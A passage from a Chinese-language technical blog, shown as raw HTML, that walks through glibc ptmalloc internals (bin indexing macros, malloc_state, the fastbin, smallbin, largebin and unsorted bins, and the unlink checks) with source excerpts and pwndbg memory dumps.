spellcheck="true">//bool值为0</span><span class="token macro property">#<span class="token directive keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)    </span><span class="token comment" spellcheck="true">//(64-0)*16 == 1024</span><span class="token macro property">#<span class="token directive keyword">define</span> in_smallbin_range(sz)  \  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)  </span><span class="token comment" spellcheck="true">//bool值，判断sz在smallbins中</span><span class="token comment" spellcheck="true">/*获取size对应的smallbin index*/</span><span class="token macro property">#<span class="token directive keyword">define</span> smallbin_index(sz) \  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) >> 4) : (((unsigned) (sz)) >> 3))\   + SMALLBIN_CORRECTION)  </span><span class="token comment" spellcheck="true">//如 size==0x100, (0x100 >> 4 + 0) == 0x10</span><span class="token comment" spellcheck="true">/*获取size对应的largebin index 32位下*/</span><span class="token macro property">#<span class="token directive keyword">define</span> largebin_index_32(sz)                                                \  (((((unsigned long) (sz)) >> 6) &lt;= 38) ?  56 + (((unsigned long) (sz)) >> 6) :\   ((((unsigned long) (sz)) >> 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) >> 9) :\   ((((unsigned long) (sz)) >> 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) >> 12) :\   ((((unsigned long) (sz)) >> 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) >> 15) :\   ((((unsigned long) (sz)) >> 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) >> 18) :\   126)   </span><span class="token comment" spellcheck="true">//可以看出这里是进行范围归类</span><span class="token macro property">#<span class="token directive keyword">define</span> largebin_index_32_big(sz)                                            \  (((((unsigned long) (sz)) >> 6) &lt;= 45) ?  49 + (((unsigned long) (sz)) >> 6) :\   ((((unsigned long) (sz)) >> 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) >> 9) :\   ((((unsigned long) (sz)) >> 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) >> 12) :\   ((((unsigned long) (sz)) >> 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) >> 15) :\   ((((unsigned long) (sz)) >> 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) >> 18) :\   126)</span><span class="token macro property">#<span class="token directive keyword">define</span> largebin_index_64(sz)                                                \  (((((unsigned long) (sz)) >> 6) &lt;= 48) ?  48 + (((unsigned long) (sz)) >> 6) :\   ((((unsigned long) (sz)) >> 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) >> 9) :\   ((((unsigned long) (sz)) >> 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) >> 12) :\   ((((unsigned long) (sz)) >> 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) >> 15) :\   ((((unsigned long) (sz)) >> 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) >> 18) :\   126)</span><span class="token macro property">#<span class="token directive keyword">define</span> largebin_index(sz) \  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \   : largebin_index_32 (sz))</span><span class="token comment" spellcheck="true">/*获取size对应的bins index，不是small bins 就是large bins*/</span><span class="token macro property">#<span class="token directive keyword">define</span> bin_index(sz) \  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span></code></pre><h3 id="关于unsorted-bin在bins中的位置"><a href="#关于unsorted-bin在bins中的位置" class="headerlink" title="关于unsorted bin在bins中的位置"></a>关于unsorted bin在bins中的位置</h3><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. 前面提到的无序bin即bin[1]就是这个unsortedbin*/</span><span class="token macro property">#<span class="token directive keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1)) </span><span class="token comment" spellcheck="true">//M 即main_arena</span></code></pre><h2 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h2><p>该结构用于管理堆，记录每个 arena 当前申请的内存的具体状态，比如说是否有空闲 chunk，有什么大小的空闲 chunk 等等。无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构。由于 thread 的 arena 可能有多个，malloc state 结构会在最新申请的 arena 中。<br><strong>注意malloc_state在libc.so中作为一个全局变量，存在于libc.so的数据段</strong></p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*sourcecode980行包含头文件*/</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span> </span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">struct</span> malloc_state<span class="token punctuation">;</span>    <span class="token keyword">typedef</span> <span class="token keyword">struct</span> malloc_state <span class="token operator">*</span>mstate<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//定义mastate指针，指向malloc_state结构体</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">struct</span> malloc_state  <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* Serialize access. 该变量用于控制程序串行访问同一个分配区，当一个线程获取了分配区之后，其它线程要想访问该分配区，就必须等待该线程分配完成后才能够使用。 */</span>  <span class="token function">__libc_lock_define</span> <span class="token punctuation">(</span><span class="token punctuation">,</span> mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Flags (formerly in max_fast). flags 记录了分配区的一些标志 */</span>  <span class="token keyword">int</span> flags<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Set if the fastbin chunks contain recently inserted free blocks. 如果 fastbins包含free chunk 就被置1 */</span>  <span class="token comment" spellcheck="true">/* Note this is a bool but not all targets support atomics on booleans.  */</span>  <span class="token keyword">int</span> have_fastchunks<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Fastbins 存放每个 fast chunk 链表头部的指针*/</span>  mfastbinptr fastbinsY<span class="token punctuation">[</span>NFASTBINS<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//64位下 size_t==8 可以算出NFASTBINS==9</span>  <span class="token comment" spellcheck="true">/* Base of the topmost chunk -- not otherwise kept in a bin top chunk的地址*/</span>  mchunkptr top<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* The remainder from the most recent split of a small request 最后一次响应一个小的chunk被切出，所剩的chunk*/</span>  mchunkptr last_remainder<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Normal bins packed as described above */</span>  mchunkptr bins<span class="token punctuation">[</span>NBINS <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//128*2-2==254</span>  <span class="token comment" spellcheck="true">/* Bitmap of bins ptmalloc 用一个 bit 来标识某一个 bin 中是否包含空闲 chunk*/</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> binmap<span class="token punctuation">[</span>BINMAPSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//128/(1&lt;&lt;5) == 4</span>  <span class="token comment" spellcheck="true">/* Linked list */</span>  <span class="token keyword">struct</span> malloc_state <span class="token operator">*</span>next<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Linked list for free arenas.  Access to this field is serialized     by free_list_lock in arena.c.  */</span>  <span class="token keyword">struct</span> malloc_state <span class="token operator">*</span>next_free<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Number of threads attached to this arena.  0 if the arena is on     the free list.  Access to this field is serialized by     free_list_lock in arena.c.  */</span>  INTERNAL_SIZE_T attached_threads<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Memory allocated from the system in this arena. 当前arena从系统中分配的内存 */</span>  INTERNAL_SIZE_T system_mem<span class="token punctuation">;</span>  INTERNAL_SIZE_T max_system_mem<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h3 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins"></a>fastbins</h3><blockquote><p>大多数程序经常会申请以及释放一些比较小的内存块。如果将一些较小的 chunk 释放之后发现存在与之相邻的空闲的 chunk 并将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要对 chunk 进行分割，这样就大大降低了堆的利用效率。因为我们把大部分时间花在了合并、分割以及中间检查的过程中。因此，ptmalloc 中专门设计了 fast bin，对应的变量就是 malloc state 中的 fastbinsY—-ctf_wiki</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> malloc_chunk <span class="token operator">*</span>mfastbinptr<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*    This is in malloc_state.    /* Fastbins */</span>    mfastbinptr fastbinsY<span class="token punctuation">[</span> NFASTBINS <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token operator">/</span></code></pre><p>并且每个 <strong>bin 采取 LIFO 策略</strong>,ptmalloc 会首先判断 fastbin 中相应的 bin 中是否有对应大小的空闲块，如果有的话，就会直接从这个 bin 中获取 chunk这是在引入tcache之前的情况<br><strong>需要特别注意的是，fastbin 范围的 chunk 的 inuse 始终被置为 1。因此它们不会和其它被释放的 chunk 合并</strong>。但是当释放的 chunk 与该 chunk 相邻的空闲 chunk 合并后的大小大于 FASTBIN_CONSOLIDATION_THRESHOLD 时，内存碎片可能比较多了，我们就需要把 fast bins 中的 chunk 都进行合并，以减少内存碎片对系统的影响</p><h3 id="smallbins"><a href="#smallbins" class="headerlink" title="smallbins"></a>smallbins</h3><p>small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ <em>index，具体如下<br><img src="https://s1.ax1x.com/2020/10/13/0hO2Ps.png" alt=""><br>small bins 中一共有 62 个循环双向链表，每个链表中存储的 chunk 大小都一致。比如对于 32 位系统来说，下标 2 对应的双向链表中存储的 chunk 大小为均为 16 字节。每个链表都有链表头结点，这样可以方便对于链表内部结点的管理。此外，*</em>small bins 中每个 bin 对应的链表采用 FIFO 的规则，所以同一个链表中先被释放的 chunk 会先被分配出去。**</p><p>largebins<br>arge bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下：<br><img src="https://s1.ax1x.com/2020/10/13/0hOc5j.png" alt=""><br>这里我们以 32 位平台的 large bin 为例，第一个 large bin 的起始 chunk 大小为 512 字节，位于第一组，所以该 bin 可以存储的 chunk 的大小范围为 [512,512+64)。</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><pre class=" language-c"><code class="language-c"><span class="token operator">*</span>   Unsorted chunks    All remainders from chunk <span class="token function">splits</span><span class="token punctuation">(</span>分割chunk后的剩余块<span class="token punctuation">)</span><span class="token punctuation">,</span> as well as all returned <span class="token function">chunks</span><span class="token punctuation">(</span>所有被free的 chunk<span class="token punctuation">)</span><span class="token punctuation">,</span>    are first placed in the <span class="token string">"unsorted"</span> bin<span class="token punctuation">.</span> They are then placed    in regular bins after malloc gives them ONE chance to be used before    <span class="token function">binning</span><span class="token punctuation">(</span>之后他们都有机会进入属于他们的常规bins<span class="token punctuation">)</span><span class="token punctuation">.</span> So<span class="token punctuation">,</span> basically<span class="token punctuation">,</span> the unsorted_chunks list acts as a queue<span class="token punctuation">,</span>    with chunks being placed on it in <span class="token function">free</span> <span class="token punctuation">(</span>and malloc_consolidate<span class="token punctuation">)</span><span class="token punctuation">,</span>    and taken <span class="token function">off</span> <span class="token punctuation">(</span>to be either used or placed in bins<span class="token punctuation">)</span> in malloc<span class="token punctuation">.</span>    The NON_MAIN_ARENA flag is never set <span class="token keyword">for</span> unsorted chunks<span class="token punctuation">,</span> so it    does not have to be taken into account in size <span class="token function">comparisons</span><span class="token punctuation">(</span>不会考虑他们的大小顺序<span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token operator">*</span><span class="token operator">/</span></code></pre><p><strong>就是把unsorted bin作为其他bins的缓冲区</strong><br>注意bins和fastbins是区分开的</p><p>举一例子：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">void</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x81</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span><span class="token operator">*</span> p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*void* p1 = malloc(0x90);    void* p2 = malloc(0x90);    void* p3 = malloc(0x90);    void* p4 = malloc(0x90);    void* p5 = malloc(0x100);    */</span>    <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在执行第一个free后：</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> parseheap addr                prev                size                 status              fd                bk                <span class="token number">0x602000</span>            <span class="token number">0x0</span>                 <span class="token number">0x90</span>                 Freed     <span class="token number">0x7ffff7dd1b78</span>    <span class="token number">0x7ffff7dd1b78</span><span class="token number">0x602090</span>            <span class="token number">0x90</span>                <span class="token number">0x90</span>                 Used                None              None<span class="token number">0x602120</span>            <span class="token number">0x0</span>                 <span class="token number">0xa0</span>                 Used                None              Nonepwndbg<span class="token operator">></span> binsfastbins<span class="token number">0x20</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x30</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x40</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x50</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x60</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x70</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x80</span><span class="token operator">:</span> <span class="token number">0x0</span>unsortedbinall<span class="token operator">:</span> <span class="token number">0x0</span>smallbinsemptylargebinsemptypwndbg<span class="token operator">></span> </code></pre><p>按照规则，p应该会被放到unsorted bin，但是在parseheap中却没看到，我们可以看一下main_arena:</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token operator">&amp;</span>main_arena<span class="token number">0x7ffff7dd1b20</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000100000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b30</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b40</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b50</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">48</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b60</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b70</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">80</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x00000000006021c0</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>top chunk<span class="token number">0x7ffff7dd1b80</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">96</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000602000</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>unsorted bin<span class="token number">0x7ffff7dd1b90</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">112</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000602000</span>    <span class="token number">0x00007ffff7dd1b88</span><span class="token number">0x7ffff7dd1ba0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">128</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd1b88</span>    <span class="token number">0x00007ffff7dd1b98</span><span class="token number">0x7ffff7dd1bb0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">144</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd1b98</span>    <span class="token number">0x00007ffff7dd1ba8</span><span class="token number">0x7ffff7dd1bc0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">160</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd1ba8</span>    <span class="token number">0x00007ffff7dd1bb8</span><span class="token number">0x7ffff7dd1bd0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">176</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd1bb8</span>    <span class="token number">0x00007ffff7dd1bc8</span><span class="token number">0x7ffff7dd1be0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">192</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd1bc8</span>    <span class="token number">0x00007ffff7dd1bd8</span><span class="token number">0x7ffff7dd1bf0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">208</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd1bd8</span>    <span class="token number">0x00007ffff7dd1be8</span><span class="token number">0x7ffff7dd1c00</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">224</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd1be8</span>    <span class="token number">0x00007ffff7dd1bf8</span><span class="token number">0x7ffff7dd1c10</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">240</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd1bf8</span>    <span class="token number">0x00007ffff7dd1c08</span></code></pre><p>可以看到p chunk已经被放到了unsorted bin的链表中，只是插件没显示出来，很常见</p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>unlink 用来将一个双向链表（只存储空闲的 chunk）中的一个元素取出来，可能在以下地方使用</p><ul><li>malloc<ul><li>从恰好大小合适的 large bin 中获取 chunk。<ul><li>这里需要注意的是 fastbin 与 small bin 就没有使用 unlink，这就是为什么漏洞会经常出现在它们这里的原因。</li><li>依次遍历处理 unsorted bin 时也没有使用 unlink 。</li></ul></li><li>从比请求的 chunk 所在的 bin 大的 bin 中取 chunk。</li></ul></li><li>free<ul><li>后向合并，合并物理相邻低地址空闲 chunk。    </li><li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li><li>malloc_consolidate<ul><li>后向合并，合并物理相邻低地址空闲 chunk。</li><li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li><li>realloc<ul><li>前向扩展，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li></ul><p>unlink在libc中直接被定义成了一个宏</p><pre class=" language-c"><code class="language-c">\<span class="token operator">/</span><span class="token operator">*</span> Take a chunk off a bin list<span class="token punctuation">.</span> Unlink操作 They are all free chunk<span class="token operator">*</span><span class="token operator">/</span><span class="token comment" spellcheck="true">/*1：检查两个记录chunk p size的字段是否相等2：检查fd，bk是否回指chunk p3：进行unlink4：如果size属于smallbins范围内则结束该函数*/</span><span class="token comment" spellcheck="true">/* Take a chunk off a bin list av==arena P==目标 FD==下一个 BK==前一个*/</span><span class="token macro property">#<span class="token directive keyword">define</span> unlink(AV, P, BK, FD) {                                            \    </span><span class="token comment" spellcheck="true">/*由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。*/</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">prev_size</span> <span class="token punctuation">(</span><span class="token function">next_chunk</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      \      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted size vs. prev_size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               \    <span class="token comment" spellcheck="true">/*获取寻找其他两个chunk*/</span>    FD <span class="token operator">=</span> P<span class="token operator">-></span>fd<span class="token punctuation">;</span>                                      \    BK <span class="token operator">=</span> P<span class="token operator">-></span>bk<span class="token punctuation">;</span>                                      \    <span class="token comment" spellcheck="true">/*检查：要求fd->bk=p,以及bk->fd=p,两边指中间*/</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              \      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  \    <span class="token keyword">else</span> <span class="token punctuation">{</span>                                      \        FD<span class="token operator">-></span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>                                  \        BK<span class="token operator">-></span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>                                  \        <span class="token comment" spellcheck="true">/*检查：如果size范围在smallbins中则完成unlink，否则对largebin进行操作*/</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>size<span class="token punctuation">)</span>                      \            <span class="token operator">&amp;&amp;</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              \        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>          \        <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    \          <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span>                      \                   <span class="token string">"corrupted double-linked list (not small)"</span><span class="token punctuation">,</span>    \                   P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>                          \            <span class="token keyword">if</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>fd_nextsize <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                      \                <span class="token keyword">if</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize <span class="token operator">==</span> P<span class="token punctuation">)</span>                      \                  FD<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> FD<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>              \                <span class="token keyword">else</span> <span class="token punctuation">{</span>                                  \                    FD<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>                  \                    FD<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>                  \                    P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>                  \                    P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>                  \                  <span class="token punctuation">}</span>                                  \              <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                  \                P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>              \                P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>              \              <span class="token punctuation">}</span>                                      \          <span class="token punctuation">}</span>                                      \      <span class="token punctuation">}</span>                                         \<span class="token punctuation">}</span></code></pre><p>以smallbins中的unlink为例：<br><img src="https://s1.ax1x.com/2020/10/13/0hORGn.png" alt=""></p><h2 id="malloc-init-state–malloc-state初始化"><a href="#malloc-init-state–malloc-state初始化" class="headerlink" title="malloc_init_state–malloc_state初始化"></a>malloc_init_state–malloc_state初始化</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">malloc_init_state</span><span class="token punctuation">(</span>mstate av<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span>     i<span class="token punctuation">;</span>    mbinptr bin<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Establish circular links for normal bins 从bins[1]开始为其初始化fd,bk指针*/</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NBINS<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//每次初始化两个bins数组，这里只是都指向自己地址-0x10</span>        bin     <span class="token operator">=</span> <span class="token function">bin_at</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        bin<span class="token operator">-></span>fd <span class="token operator">=</span> bin<span class="token operator">-></span>bk <span class="token operator">=</span> bin<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token macro property">#<span class="token directive keyword">if</span> MORECORE_CONTIGUOUS</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>        <span class="token function">set_noncontiguous</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">==</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span> <span class="token function">set_max_fast</span><span class="token punctuation">(</span>DEFAULT_MXFAST<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 设置 flags 标记目前没有fast chunk</span>    av<span class="token operator">-></span>flags <span class="token operator">|</span><span class="token operator">=</span> FASTCHUNKS_BIT<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 就是 unsorted bin</span>    av<span class="token operator">-></span>top <span class="token operator">=</span> <span class="token function">initial_top</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>我们对第一次malloc来跟踪一下：</p><pre class=" language-c"><code class="language-c"> ► <span class="token number">0x7ffff7aae550</span> <span class="token operator">&lt;</span>malloc<span class="token operator">></span>                            push   rbp   <span class="token number">0x7ffff7aae551</span> <span class="token operator">&lt;</span>malloc<span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span>                          push   rbx   <span class="token number">0x7ffff7aae552</span> <span class="token operator">&lt;</span>malloc<span class="token operator">+</span><span class="token number">2</span><span class="token operator">></span>                          sub    rsp<span class="token punctuation">,</span> <span class="token number">8</span>   <span class="token number">0x7ffff7aae556</span> <span class="token operator">&lt;</span>malloc<span class="token operator">+</span><span class="token number">6</span><span class="token 